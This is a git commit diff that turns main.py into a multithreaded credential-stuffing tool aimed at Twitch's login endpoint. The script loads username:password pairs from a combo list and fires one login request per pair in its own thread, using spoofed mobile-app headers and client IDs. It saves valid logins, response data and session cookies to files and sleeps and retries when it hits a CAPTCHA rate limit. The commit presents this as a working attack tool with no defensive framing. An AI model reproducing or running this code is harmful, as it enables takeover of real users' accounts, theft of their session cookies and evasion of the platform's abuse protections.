8a10f8f8a9915c32f42b8562333f8f436c58c181
Tekky <98614666+xtekky@users.noreply.github.com>
2022-05-29 20:19:42 +0200

    ~ 😈 [major improvements]

--- main.py
+++ main.py
@@ -1,24 +1,65 @@
-import requests
+import threading, time, requests
 
-url = "https://passport.twitch.tv/login"
 
-passw = ""
-username = ""
+class Brute:
+    def __init__(self):
+        self.login = requests.post
 
-payload = f"{\"client_id\":\"kd1unb4b3q4t58fwlpcbzcbnm76a8fp\",\"force_twitchguard\":false,\"password\":\"{passw}\",\"undelete_user\":false,\"username\":\"{username}\"}"
+        self.rates = 0
+        self.hits = 0
+        self.errors = 0
 
-headers = {
-    "content-type": "application/json; charset=UTF-8",
-    "host": "passport.twitch.tv",
-    "connection": "Keep-Alive",
-    "accept-encoding": "gzip",
-    "client-id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp",
-    "accept": "application/vnd.twitchtv.v3+json",
-    "accept-language": "en-us",
-    "x-device-id": "7549bd7d0bf549159a556926aebf0c43",
-    "user-agent": "Dalvik/2.1.0 (Linux; U; Android 7.1.2; SM-G973N Build/PPR1.190810.011) tv.twitch.android.app/13.0.0/1300000"
-}
+        self.combos = []
 
-response = requests.post(url, data=payload, headers=headers)
+        for __ in open('combos.txt', 'r'):
+            self.combos.append(__.rstrip())
 
-print(response.text)
+        for _ in self.combos:
+            threading.Thread(target=self.bruter, args=(_,)).start()
+
+    def bruter(self, combo):
+
+        loaded_set = combo
+
+        username = loaded_set.split(":")[0]
+        password = loaded_set.split(":")[1]
+
+        DATA_V1 = {
+            "username": username,
+            "password": password,
+            "client_id": "kimne78kx3ncx6brgo4mv6wki5h1ko",
+            "undelete_user": False
+        }
+
+        PARAMS_V1 = {
+            "content-type": "application/json; charset=UTF-8",
+            "host": "passport.twitch.tv",
+            "connection": "Keep-Alive",
+            "accept-encoding": "gzip",
+            "client-id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp",
+            "accept": "application/vnd.twitchtv.v3+json",
+            "accept-language": "en-us",
+            "user-agent": "Dalvik/2.1.0 (Linux; U; Android 7.1.2; SM-G973N Build/PPR1.190810.011) tv.twitch.android.app/13.0.0/1300000"
+        }
+
+        response = self.login("https://passport.twitch.tv/login", json=DATA_V1, headers=PARAMS_V1)
+
+        if "captcha_proof" in response.text:
+            self.hits += 1
+            print(loaded_set, file=open('hits.txt', 'a'))
+            print(response.json(), file=open('logs.txt', 'a'))
+            print(response.cookies, file=open('cookies.txt', 'a'))
+
+        elif "Please complete the CAPTCHA correctly." in response.text:
+            self.rates += 1; self.errors += 1
+            time.sleep(30)
+            self.bruter(loaded_set)
+
+        elif "Incorrect username or password." in response.text:
+            self.errors += 1
+
+        else:
+            self.errors += 1
+
+
+Brute()
